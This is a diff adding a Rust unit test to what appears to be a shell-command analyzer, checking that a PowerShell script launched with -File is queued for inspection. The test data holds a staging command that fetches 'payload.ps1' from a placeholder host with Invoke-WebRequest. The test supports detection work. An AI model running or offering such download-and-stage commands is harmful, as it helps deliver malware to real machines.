@@ -9845,7 +9845,7 @@ mod call_wrapper_tests {
 #[cfg(test)]
 mod powershell_tests {
     use crate::analyze;
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
     use base64::Engine;
@@ -9936,6 +9936,25 @@ mod powershell_tests {
         assert_eq!(env.exec_ps1.len(), 1);
         let stored = String::from_utf8_lossy(&env.exec_ps1[0]);
         assert!(stored.contains("Get-Process"), "got: {}", stored);
+    }
+
+    #[test]
+    fn powershell_file_current_dir_tracks_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-file-current-dir.example/payload.ps1".to_vec();
+        env.modified_filesystem.insert(
+            "stage.ps1".to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+        interpret_line(r"powershell -NoProfile -File .\stage.ps1", &mut env);
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell -File current-dir script was not queued: {:?}",
+            env.exec_ps1
+        );
     }
 
     #[test]
